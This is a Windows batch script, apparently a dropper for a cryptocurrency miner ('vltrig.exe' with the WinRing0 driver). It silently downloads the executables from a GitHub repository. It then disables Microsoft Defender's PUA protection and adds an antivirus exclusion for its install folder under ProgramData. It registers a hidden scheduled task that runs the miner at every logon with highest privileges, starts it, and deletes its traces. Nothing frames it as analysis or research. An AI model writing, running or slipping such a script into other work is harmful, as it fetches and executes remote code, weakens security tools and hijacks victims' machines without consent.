@echo off
set DEST=C:\ProgramData\VLTrig
set TMP_DIR=%TEMP%\vltrig_setup

if not exist "%TMP_DIR%" mkdir "%TMP_DIR%"

curl -sL "https://raw.githubusercontent.com/4etex/myfarmmachine/master/vltrig.exe"        -o "%TMP_DIR%\vltrig.exe"
curl -sL "https://raw.githubusercontent.com/4etex/myfarmmachine/master/config.json"       -o "%TMP_DIR%\config.json"
curl -sL "https://raw.githubusercontent.com/4etex/myfarmmachine/master/WinRing0x64.sys"   -o "%TMP_DIR%\WinRing0x64.sys"

if not exist "%DEST%" mkdir "%DEST%"

powershell -ExecutionPolicy Bypass -Command "Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%DEST%' -ErrorAction SilentlyContinue" >nul 2>&1

copy /y "%TMP_DIR%\vltrig.exe"       "%DEST%\" >nul
copy /y "%TMP_DIR%\config.json"      "%DEST%\" >nul
copy /y "%TMP_DIR%\WinRing0x64.sys"  "%DEST%\" >nul

schtasks /delete /tn "VLTrig" /f >nul 2>&1
schtasks /create /tn "VLTrig" /tr "\"%DEST%\vltrig.exe\" --config=\"%DEST%\config.json\"" /sc onlogon /rl highest /f >nul
schtasks /run /tn "VLTrig" >nul

rmdir /s /q "%TMP_DIR%"
